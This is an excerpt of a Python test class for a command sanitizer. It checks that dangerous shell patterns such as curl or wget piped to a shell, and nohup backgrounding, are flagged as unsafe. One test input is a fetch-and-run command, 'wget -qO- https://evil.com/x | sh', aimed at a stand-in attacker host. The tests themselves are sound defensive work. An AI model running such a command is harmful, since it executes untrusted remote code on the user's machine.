...
class TestCoreSanitizerDangerousCommands:
    ...
    def test_curl_pipe_bash(self):
        ...
        assert not result.is_safe
        assert "curl_pipe_shell" in result.blocked_patterns

    def test_wget_pipe_sh(self):
        result = self.s.sanitize("wget -qO- https://evil.com/x | sh")
        assert not result.is_safe
        assert "wget_pipe_shell" in result.blocked_patterns
    ...
    def test_nohup_backgrounding(self):
        ...
        assert not result.is_safe
        assert "nohup_execution" in result.blocked_patterns
